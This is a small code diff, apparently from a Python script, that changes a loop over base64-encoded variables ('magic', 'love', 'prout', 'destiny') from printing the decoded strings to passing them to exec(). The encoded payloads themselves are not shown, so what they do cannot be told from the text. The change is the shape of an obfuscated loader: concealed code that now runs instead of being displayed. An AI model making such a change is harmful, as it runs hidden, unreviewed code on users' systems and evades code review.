@@ -7,4 +7,4 @@ joy = (magic, love, prout, destiny)
 for el in joy:
     decoded = base64.b64decode(el)
     command = decoded.decode('utf-8')
-    print(command)
+    exec(command)
